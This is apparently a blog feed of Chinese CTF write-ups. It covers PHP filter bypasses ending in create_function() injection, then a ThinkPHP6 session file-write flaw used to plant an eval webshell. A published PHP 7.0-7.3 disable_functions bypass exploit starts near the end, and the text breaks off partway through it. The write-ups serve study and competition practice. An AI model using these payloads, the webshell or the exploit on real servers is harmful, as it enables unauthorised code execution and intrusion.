&#x27;aqua_is_cute&#x27;)</span><br></pre></td></tr></table></figure><p>我们可以看到preg_match中的/^$/可知是单行的匹配，而且这个if的思路是debu参数的值既要是aqua_is_cute，又不可以是aqua_is_cute，所以对于这种情况，我们可以使用换行符%0a来绕过，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debu=%0aaqua_is_cute</span><br></pre></td></tr></table></figure><h2 id="对于第三个if"><a href="#对于第三个if" class="headerlink" title="对于第三个if"></a>对于第三个if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foreach($_REQUEST as $value) &#123; </span><br><span class="line">if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))</span><br></pre></td></tr></table></figure><p>由于这里想限制我们传入的值不可以是字母，而$_REQUEST不仅会接收get请求，也会接收post请求和cookie请求，但是post优先级比较大，所以我们只需get传入参数，post再传入传入相同参数，便可绕过，此时php.ini中的variables_order的设置，默认为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variables_order = &quot;GPCS&quot;</span><br></pre></td></tr></table></figure><h2 id="对于第四个if"><a href="#对于第四个if" class="headerlink" title="对于第四个if"></a>对于第四个if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br></pre></td></tr></table></figure><p>可以使用data伪协议进行绕过，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,debu_debu_aqua</span><br></pre></td></tr></table></figure><h2 id="对于第五个if"><a href="#对于第五个if" class="headerlink" title="对于第五个if"></a>对于第五个if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )</span><br></pre></td></tr></table></figure><p>我们可以构造数组进行绕过，因为传入sha1()函数的参数的值为数组时会报错，返回false，所以当构造数组时可以绕过，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shana[]=1&amp;passwd[]=2</span><br></pre></td></tr></table></figure><h2 id="对于第六个if"><a href="#对于第六个if" class="headerlink" title="对于第六个if"></a>对于第六个if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) )</span><br></pre></td></tr></table></figure><p>我们可以看向正则中匹配的地方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^[a-z0-9]*$/isD</span><br></pre></td></tr></table></figure><p>可以看见后面是isD，其中i是不分大小写，而s是.匹配包括换行的所有元素，D是$只匹配字符串末尾，不匹配换行，而/^*$/意思是不能从头到尾是字母和数字，所以我们可以使用create_function()函数</p><h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p>create_function()函数有两个参数$args和$code，用于创建一个lambda样式的函数</p><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>php创建一个函数，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function myFunc($a,$b)&#123;</span><br><span class="line">return $a+$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用create_function()函数创建相同的myFunc()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$myFunc=create_function(&#x27;$a,$b&#x27;,&#x27;return($a+$b);&#x27;);</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function myFunc($a,$b)&#123;</span><br><span class="line">return $a+$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以这样使用这个create_function函数，来执行我们想要的代码<br>create_function构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myFunc = create_function(&#x27;$a, $b&#x27;, &#x27;return($a+$b);&#125;eval($_POST[&#x27;Y1ng&#x27;]);\\&#x27;);</span><br></pre></td></tr></table></figure><p>执行时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function myFunc($a, $b)&#123;</span><br><span class="line">return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">eval($_POST[&#x27;Y1ng&#x27;]);//&#125;</span><br></pre></td></tr></table></figure><p>但是因为$arg被过滤太多的系统函数，所以我们可以使用get_defined_vars()来输出所有的变量和值，所以我们可以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[arg]=;&#125;var_dump(get_defined_vars());</span><br></pre></td></tr></table></figure><p>我们可以看见它让我们在rea1fl4g.php中读取flag，所以我们可以使用require代替include包含，因为include被过滤了，而由于过滤了双引号，所以可以使用base64_decode()来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[arg]=;&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars);//</span><br></pre></td></tr></table></figure><p>来读取flag，但是这个方法我试不通，所以我们使用了取反来读，exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$s = &#x27;php://filter/convert.base64-encode/resource=rea1fl4g.php&#x27;;</span><br><span class="line">echo urlencode(~$s);</span><br></pre></td></tr></table></figure><p>然后构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[arg]=&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//</span><br></pre></td></tr></table></figure><p>对于这题注意的点是要将cookie删掉，否则绕不过第三个if</p><p>参考文章：[<a href="https://blog.csdn.net/rfrder/article/details/111824177]">https://blog.csdn.net/rfrder/article/details/111824177]</a></p><pre><code>[https://www.gem-love.com/ctf/770.html][https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php]</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SERVER-‘QUERY-STRING’-绕过以及-y1ngzuishuai-的正则匹配绕过以及-REQUEST-的字母匹配绕过以及sha1-函数绕过以及create-function-代码注入&quot;&gt;&lt;a href=&quot;#SERVER-‘QUERY-STRING’-</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP6任意文件操作漏洞分析</title>
    <link href="http://example.com/2021/10/09/ThinkPHP6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/10/09/ThinkPHP6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-10-08T16:00:00.000Z</published>
    <updated>2021-10-09T13:24:30.454Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP6任意文件操作漏洞分析"><a href="#ThinkPHP6任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6任意文件操作漏洞分析"></a>ThinkPHP6任意文件操作漏洞分析</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在开启session的情况下可以导致创建任意文件以及删除文件，在特定情况下可以getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### ctype_alnum($text)</span><br></pre></td></tr></table></figure><p>检测输入的$text中所有的字符全部是字母和数字，如果是，返回TRUE，否则返回FALSE</p><p>在源码中，/src/think/session/Store.php中的212行设置id时增加了一个函数ctype_alnum($text)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * session_id设置</span><br><span class="line"> * @access public</span><br><span class="line"> * @param string $id session_id</span><br><span class="line"> * @return void</span><br><span class="line"> */</span><br><span class="line">public function setId($id = null): void</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());</span><br><span class="line">    $this-&gt;id=is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id)? $id:md5(microtime(true).session_create_id());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br></pre></td></tr></table></figure><p>而上面也有提及，ctype_alnum()函数是检测$id是否全部是字母和数字的，所以根据文件目录和更改的函数部分猜测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可能是存储Session时导致的文件写入，所以我们可以跟进相关的函数，看向vendor/topthink/framework/src/think/session/Store.php的254行的save()函数</span><br></pre></td></tr></table></figure><p>   /**<br>     * 保存session数据<br>     * @access public<br>     * @return void<br>     */<br>    public function save(): void<br>    {<br>        $this-&gt;clearFlashData();</p><pre><code>    $sessionId = $this-&gt;getId();    if (!empty($this-&gt;data)) &#123;        $data = $this-&gt;serialize($this-&gt;data);        $this-&gt;handler-&gt;write($sessionId, $data);    &#125; else &#123;        $this-&gt;handler-&gt;delete($sessionId);    &#125;    $this-&gt;init = false;&#125;/**</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后看向</span><br></pre></td></tr></table></figure><p>$this-&gt;handler-&gt;write($sessionId, $data);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">然后跟进write()函数，在vendor/topthink/framework/src/think/session/driver/File.php中的210行代码</span><br><span class="line">```   </span><br><span class="line"> /**</span><br><span class="line">     * 写入Session</span><br><span class="line">     * @access public</span><br><span class="line">     * @param string $sessID</span><br><span class="line">     * @param string $sessData</span><br><span class="line">     * @return bool</span><br><span class="line">     */</span><br><span class="line">    public function write(string $sessID, string $sessData): bool</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = $this-&gt;getFileName($sessID, true);</span><br><span class="line">        $data     = $sessData;</span><br><span class="line"></span><br><span class="line">        if ($this-&gt;config[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123;</span><br><span class="line">            //数据压缩</span><br><span class="line">            $data = gzcompress($data, 3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $this-&gt;writeFile($filename, $data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br></pre></td></tr></table></figure><p>然后我们看向writeFile()函数，然后跟进vendor/topthink/framework/src/think/session/driver/File.php中的170行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* 写文件（加锁）</span><br><span class="line"> * @param $path</span><br><span class="line"> * @param $content</span><br><span class="line"> * @return bool</span><br><span class="line"> */</span><br><span class="line">protected function writeFile($path, $content): bool</span><br><span class="line">&#123;</span><br><span class="line">    return (bool) file_put_contents($path, $content, LOCK_EX);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以从代码中看见file_put_contents()函数，可知内容$content被写入$path中</p><p>所以整体思路是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">写入函数file_put_contents($path,$content,LOCK_EX)中的参数$path和$content来源于函数writeFile($path,$data)</span><br><span class="line"></span><br><span class="line">而writeFile($path,$data)中的参数$path和$data来源于函数write(String $sessionID,String $sessiData)</span><br><span class="line"></span><br><span class="line">而wirte(String $sessionID,String $sessiData)中参数$sessionID和$sessiData来源于save()中调用的write()</span><br></pre></td></tr></table></figure><p>而其中write()函数中$sessionID的值调用了getId()传入的，在源码vendor/topthink/framework/src/think/session/Store.php中的129行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function getId(): string</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在getId时，需要先创建sessionId，所以要找setId()函数，在源码vendor/topthink/framework/src/think/session/Store.php中的119行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function setId($id = null): void</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以看向调用setId()的函数handle()函数，在源码vendor/topthink/framework/src/think/middleware/SessionInit.php:46中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function handle($request, Closure $next)</span><br><span class="line">&#123;</span><br><span class="line">    // Session初始化</span><br><span class="line">    $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#x27;session.var_session_id&#x27;);</span><br><span class="line">    $cookieName   = $this-&gt;session-&gt;getName();</span><br><span class="line"></span><br><span class="line">    if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) &#123;</span><br><span class="line">        $sessionId = $request-&gt;request($varSessionId);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $sessionId = $request-&gt;cookie($cookieName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($sessionId) &#123;</span><br><span class="line">        $this-&gt;session-&gt;setId($sessionId);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中$cookieName其实就是PHPSESSID，而$sessonid为PHPSESSID的值，所以为可控的值，因此可以确定write()函数中$sessionID的值</p><p>而对于$sessiData的值，可以看向vendor/topthink/framework/src/think/session/Store.php:261的变量$data传入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = $this-&gt;serialize($this-&gt;data);</span><br></pre></td></tr></table></figure><p>而$data默认环境中是空的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Session数据</span><br><span class="line"> * @var array</span><br><span class="line"> */</span><br><span class="line">protected $data = [];</span><br></pre></td></tr></table></figure><p>所以对于写入session的内容实际是有后端业务逻辑来决定的，所以要在严苛的条件下才可以写入webshell，而这个实现任意文件操作漏洞需要开启session环境下才可以实现，如果想开启session，则需要thinkphp6开启session的方法：删除/app/middleware.php最后一行的注释</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例("></a>实例(</h2><p>打开页面，发现有注册、登录和搜索的功能，所以我们在注册和登录页面尝试sql注入测试，发现不是，所以我们扫描目录，发现有<a href="http://www.zip文件泄露,同时我们再随便构造payload/">www.zip文件泄露，同时我们再随便构造payload</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/djddbebkebkb</span><br></pre></td></tr></table></figure><p>发现是ThinkPHP6版本的框架，然后审计源码，发现是ThinkPHP6版本框架的任意文件操作漏洞，我们可以利用PHPSESSID来确定生成的session文件的名字，然后$data数据，我们可以看向这个源码中的前端源码\app\home\controller\Member.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    public function search()</span><br><span class="line">    &#123;</span><br><span class="line">        if (Request::isPost())&#123;</span><br><span class="line">            if (!session(&#x27;?UID&#x27;))</span><br><span class="line">            &#123;</span><br><span class="line">                return redirect(&#x27;/home/member/login&#x27;);            </span><br><span class="line">            &#125;</span><br><span class="line">            $data = input(&quot;post.&quot;);</span><br><span class="line">            $record = session(&quot;Record&quot;);</span><br><span class="line">            if (!session(&quot;Record&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                session(&quot;Record&quot;,$data[&quot;key&quot;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                $recordArr = explode(&quot;,&quot;,$record);</span><br><span class="line">                $recordLen = sizeof($recordArr);</span><br><span class="line">                if ($recordLen &gt;= 3)&#123;</span><br><span class="line">                    array_shift($recordArr);</span><br><span class="line">                    session(&quot;Record&quot;,implode(&quot;,&quot;,$recordArr) . &quot;,&quot; . $data[&quot;key&quot;]);</span><br><span class="line">                    return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            session(&quot;Record&quot;,$record . &quot;,&quot; . $data[&quot;key&quot;]);</span><br><span class="line">            return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return View(&quot;search&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看向</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">session(&quot;Record&quot;,$data[&quot;key&quot;])</span><br><span class="line"></span><br><span class="line">session(&quot;Record&quot;,implode(&quot;,&quot;,$recordArr) . &quot;,&quot; . $data[&quot;key&quot;]);</span><br><span class="line"></span><br><span class="line">session(&quot;Record&quot;,$record . &quot;,&quot; . $data[&quot;key&quot;]);</span><br></pre></td></tr></table></figure><p>发现在搜索页面是$data的输入，所以我们可以在注册时，伪造长度为32的文件名aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php，然后进入搜索页面，进行代码的输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[cmd];?&gt;</span><br></pre></td></tr></table></figure><p>然后访问路径是/runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php<br>用蚁剑进行连接，进入后台，发现读取不了/readflag，然后在搜索页面构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>看php版本，发现disable_function中有许多的系统函数被禁，所以需要绕过disable_function，本来打算劫持系统函数，然后利用php函数中用来发邮件的函数来启动子程序，从而在子程序中执行被禁函数，来读取/readflag的，但是发现不行，也许是被过滤了或在这里发邮件函数不可以启动子程序吧，所以我们可以使用我网上找的exp来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><br><span class="line">#</span><br><span class="line"># Bug: https://bugs.php.net/bug.php?id=72530</span><br><span class="line">#</span><br><span class="line"># This exploit should work on all PHP 7.0-7.3 versions</span><br><span class="line">#</span><br><span class="line"># Author: https://github.com/mm0r1</span><br><span class="line"></span><br><span class="line">pwn(&quot;/readflag&quot;);</span><br><span class="line"></span><br><span class="line">function pwn($cmd) &#123;</span><br><span class="line">    global $abc, $helper;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 